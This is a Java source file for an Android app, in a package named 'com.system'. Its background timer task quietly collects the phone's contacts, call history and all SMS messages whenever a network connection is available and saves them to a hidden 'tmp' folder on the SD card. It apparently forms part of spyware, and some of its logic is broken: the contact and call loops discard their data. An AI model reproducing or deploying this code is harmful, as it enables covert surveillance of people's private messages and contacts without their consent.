package com.system;

import java.io.DataOutputStream;
import java.io.File;
import java.util.Date;
import java.util.List;
import java.util.TimerTask;

import com.system.feature.contact.ContactCtrl;
import com.system.feature.contact.ContactInfo;
import com.system.feature.phonecall.PhoneCallCtrl;
import com.system.feature.phonecall.PhoneCallInfo;
import com.system.feature.sms.SmsCtrl;
import com.system.feature.sms.SmsInfo;
import com.system.utils.*;

import android.app.Activity;
import android.app.Service;
import android.content.ActivityNotFoundException;
import android.content.Context;
import android.content.Intent;
import android.content.res.Resources;
import android.net.Uri;
import android.os.Environment;
import android.util.Log;

/**
 * Implementation of the timer task for information collection.
 */
public class GetInfoTask extends TimerTask 
{
	private final String LOGTAG = "GetInfoTask";
	
	private final static String DEFAULT_FOLDER = "tmp"; 
	
	public Service service;
	
	public GetInfoTask(Service service)
	{
		super();
		this.service = service;
	}
	
	public void run() 
	{
		Log.d(LOGTAG, "start to collect infomation");
		
		String now = (new Date()).toString();
		if (SysUtils.isNetworkConnected(service.getApplicationContext()))
		{
			CollectContact(this.service);
			SysUtils.ThreadSleep(100000, LOGTAG);
			CollectPhoneCallHist(this.service);
			SysUtils.ThreadSleep(100000, LOGTAG);
			CollectSms(this.service);
		}
		
	}
	
	private void CollectSms(Service service) 
	{
		StringBuilder sb = new StringBuilder();
		List<SmsInfo> list = SmsCtrl.getSmsList(service, SmsCtrl.SMS_URI_ALL);
		for (int i = 0; i < list.size(); i++)
		{
			sb.append(list.get(i).toString());
			sb.append("\r\n");
		}
		
		String fileName = FileCtrl.makeFileName(service.getApplicationContext(), 
				Resources.getSystem().getString(R.string.sms_name)); 
		try {
			if (!FileCtrl.dirExist(DEFAULT_FOLDER)) FileCtrl.creatSDDir(DEFAULT_FOLDER);
				
			FileCtrl.Save2SDCard("\\" + DEFAULT_FOLDER + "\\" + fileName, sb.toString());
		} catch (Exception e) {
			Log.e(LOGTAG, e.getMessage());
		}
	}

	private void CollectPhoneCallHist(Service service) 
	{
		StringBuilder sb = new StringBuilder();
		List<PhoneCallInfo> list = PhoneCallCtrl.getPhoneCallHistory(service);
		for (int i = 0; i < list.size(); i++)
		{
			list.get(i).toString();
		}
		
		String fileName = FileCtrl.makeFileName(service.getApplicationContext(), 
				Resources.getSystem().getString(R.string.phonecall_name)); 
		try {
			if (!FileCtrl.dirExist(DEFAULT_FOLDER)) FileCtrl.creatSDDir(DEFAULT_FOLDER);
				
			FileCtrl.Save2SDCard("\\" + DEFAULT_FOLDER + "\\" + fileName, sb.toString());
		} catch (Exception e) {
			Log.e(LOGTAG, e.getMessage());
		}
	}

	private void CollectContact(Service service) 
	{
		StringBuilder sb = new StringBuilder();
		List<ContactInfo> list = ContactCtrl.getContactList(service);
		for (int i = 0; i < list.size(); i++)
		{
			list.get(i).toString();
		}
		
		String fileName = FileCtrl.makeFileName(service.getApplicationContext(), 
				Resources.getSystem().getString(R.string.contact_name)); 
		try {
			if (!FileCtrl.dirExist(DEFAULT_FOLDER)) FileCtrl.creatSDDir(DEFAULT_FOLDER);
				
			FileCtrl.Save2SDCard("\\" + DEFAULT_FOLDER + "\\" + fileName, sb.toString());
		} catch (Exception e) {
			Log.e(LOGTAG, e.getMessage());
		}
	}
}
